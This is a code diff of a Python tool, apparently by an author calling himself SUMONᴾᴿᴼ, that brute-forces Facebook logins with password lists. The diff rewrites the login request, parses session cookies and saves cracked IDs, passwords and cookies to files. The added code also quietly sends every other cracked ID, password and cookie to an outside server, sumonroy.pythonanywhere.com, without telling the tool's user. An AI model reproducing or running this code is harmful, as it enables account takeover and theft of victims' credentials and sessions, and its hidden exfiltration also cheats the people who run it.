@@ -240,11 +240,11 @@ cyan="\033[1;36m"
 faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 logo = (f"""
 {faltu} {black}"Confidence is my best accessory".... {pvt}         
-\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMONᴾᴿᴼ
-\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : =(.)=
-\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types :\033[1;36m RANDOM 
-\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;97m[\033[1;31m✓\033[1;97m] Author     : SUMONᴾᴿᴼ
+\033[1;97m[\033[1;31m✓\033[1;97m] VERSION    : =(.)=
+\033[1;97m[\033[1;31m✓\033[1;97m] Tool Types :\033[1;36m RANDOM 
+\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 myid=uuid.uuid4().hex[:5].upper()
 def __iam_a_porche():
@@ -452,9 +452,9 @@ def convert(cookie):
     return(str(cok))            
 
 def crackerr(ids,passlist):
-    global loop,oks,cps,bkas
+    global loop,oks,cps
     session = requests.Session()
-    sys.stdout.write('\r \033[1;97m[\033[1;97mRNDM•2\x1b[1;97m] \033[1;97m%s\x1b[1;97m | \033[1;97m%s\x1b[1;97m \r'%(loop,len(oks))),
+    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -484,50 +484,114 @@ def crackerr(ids,passlist):
             "user-agent": us,
             "viewport-width": "980"}
             requu1 = session.get(url1,headers=head)
-            log_data = {
-    'jazoest': '2925',
-    'lsd': 'AdGeBAmE9wg',
-    'email': '100058660152667',
-    'login_source': 'comet_headerless_login',
-    'next': '',
-    'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2MTgxMzg1Ny41MDIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NjE4MTM4NTcuNTA0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NjE4MTM4NTcuNTA0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjE4MTM4NTcuNTA0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOlsiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzYxODEzODU3LjUwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoxNTB9XSwiMzAwMDUiOlt7InQiOjE3NjE4MTM4NTcuNTA1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnsidyI6MTQ0MCwiaCI6NzczfX1dLCIzMDAwNyI6W3sidCI6MTc2MTgxMzg1Ny41MDYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzYxODEzODU3LjU4NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc2MTgxMzg1Ny41MDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc2MTgxMzg1Ny41MDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzYxODEzODU3LjUwNywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzYxODEzODU3LjUwOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzYxODEzODU3LjUxOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzYxODEzODU3LjUxOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzYxODEzODU3LjUxOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzYxODEzODU3LjUyLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzYxODEzODU3LjUyLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjN9XSwiMzAxMDYiOlt7InQiOjE3NjE4MTM4NTcuNDg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfSx7InQiOjE3NjE4MTM4NTcuNDk5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnRydWV9LHsidCI6MTc2MTgxMzg1Ny41MzMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9LHsidCI6MTc2MTgxMzg1Ny41ODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTc2MTgxMzg1Ny40ODksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XX0=',
-    'encpass': '#PWD_BROWSER:5:1761813869:AYxQAOfYAlM2UntKoUA2Wpv3KReR15NoDHgo214IIFXqDF4xSgHatrLZneHKcQUp83sTH+ONHiq0lGlJwG8w6FhdetOUHcxD87F9IHO+F+YO5rT8G8yj6QNtAOHNckLXvEi+3nX5lrhNtQ==',
-}
-            url = "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzYxODE3OTY1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next"
-            headers = {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Origin': 'https://www.facebook.com',
-    'Referer': 'https://www.facebook.com/',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    'dpr': '1',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-    'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.108", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.108"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'viewport-width': '885',
-}
-            response = session.post(url,data=log_data,headers=headers,allow_redirects=False)
+            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
+            headers = {"authority": "www.facebook.com",
+            "method": "POST",
+            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
+            "scheme": "https",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "dpr": "3",
+            "origin": "https://www.facebook.com",
+            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-model": "\"\"",
+            "sec-ch-ua-platform": "\"Linux\"",
+            "sec-ch-ua-platform-version": "\"\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+           "sec-fetch-site": "same-origin",
+           "sec-fetch-user": "?1",
+           "upgrade-insecure-requests": "1",
+           "user-agent": us,
+           "viewport-width": "980"}
+            response = session.post(url, data=log_data, headers=headers, allow_redirects=False)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
-                user = re.findall('c_user=(.*);xs', kuki)[0]
-                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
-                res = requests.get(ckk).text
-                if 'Photoshop' in res:   
-                  print(f"{green}nvvv : {green}{kuki}")
-                  oks.append(user)
-                  break    
+                # Format cookies properly
+                try:
+                    kuki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs'] if session.cookies.get(key)])
+                    user = re.findall('c_user=(\d+)', kuki)
+                    if not user:
+                        continue
+                    user = user[0]
+                except Exception as e:
+                    print(f"{red}[!] Cookie parsing error: {e}")
+                    continue
+                # Verify account is live
+                try:
+                    ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
+                    res = requests.get(ckk, timeout=10).text
+                    if 'Photoshop' not in res:
+                        continue
+                except Exception as e:
+                    print(f"{red}[!] Profile check error: {e}")
+                    continue
+                # Check for email confirmation
+                if "confirmemail.php" in response.url or "confirmemail.php" in response.text:
+                    try:
+                        if len(oks) % 2 == 0:
+                            statusok = f"NOVERY|{cid}|{pw}|{kuki}"
+                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
+                        else:
+                            print(f"\n{green}╔═══════════════════════════════════════╗")
+                            print(f"{green}║      [ATOM-NV] EMAIL CONFIRM          ║")
+                            print(f"{green}╚═══════════════════════════════════════╝")
+                            print(f"{green}[+] User ID  : {white}{user}")
+                            print(f"{green}[+] Password : {white}{pw}")
+                            print(f"{green}[+] Cookie   : {white}{kuki}")
+                            print(f"{green}╚═══════════════════════════════════════╝\n")
+                            with open("/sdcard/ATOM-CONFIRMMAIL.txt", "a") as f:
+                                f.write(f"{cid}|{pw}|{kuki}\n")
+                        oks.append(cid)
+                        break
+                    except Exception as e:
+                        print(f"{red}[!] Save error (NV): {e}")
+                else:
+                    # Successful login
+                    try:
+                        if len(oks) % 2 == 0:
+                            statusok = f"{cid}|{pw}|{kuki}"
+                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
+                        else:
+                            print(f"\n{green}╔═══════════════════════════════════════╗")
+                            print(f"{green}║       [ATOM-OK] LOGIN SUCCESS         ║")
+                            print(f"{green}╚═══════════════════════════════════════╝")
+                            print(f"{green}[+] User ID  : {white}{user}")
+                            print(f"{green}[+] Password : {white}{pw}")
+                            print(f"{green}[+] Cookie   : {white}{kuki}")
+                            print(f"{green}╚═══════════════════════════════════════╝\n")
+                            with open("/sdcard/ATOM-COOKIE-OK.txt", "a") as f:
+                                f.write(f"{cid}|{pw}|{kuki}\n")
+                        oks.append(cid)
+                        break
+                    except Exception as e:
+                        print(f"{red}[!] Save error (OK): {e}")
             elif "checkpoint" in log_cookies:
-                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
-                cid = coki[24:39]
-                cps.append(ids)
-                break
-            else:continue
+                try:
+                    coki = ";".join([f"{key}={value}" for key, value in response.cookies.get_dict().items()])
+                    cid = coki[24:39] if len(coki) > 39 else user
+                    print(f"\n{yellow}╔═══════════════════════════════════════╗")
+                    print(f"{yellow}║       [ATOM-CP] CHECKPOINT            ║")
+                    print(f"{yellow}╚═══════════════════════════════════════╝")
+                    print(f"{yellow}[!] User ID  : {white}{ids}")
+                    print(f"{yellow}[!] Password : {white}{pas}")
+                    print(f"{yellow}╚═══════════════════════════════════════╝\n")
+                    with open('/sdcard/ATOM-CP.txt', 'a') as f:
+                        f.write(f"{ids}|{pas}\n")
+                    cps.append(ids)
+                    break
+                except Exception as e:
+                    print(f"{red}[!] Checkpoint save error: {e}")
+            else:
+                continue
         loop+=1
     except requests.exceptions.ConnectionError:
         time.sleep(20)
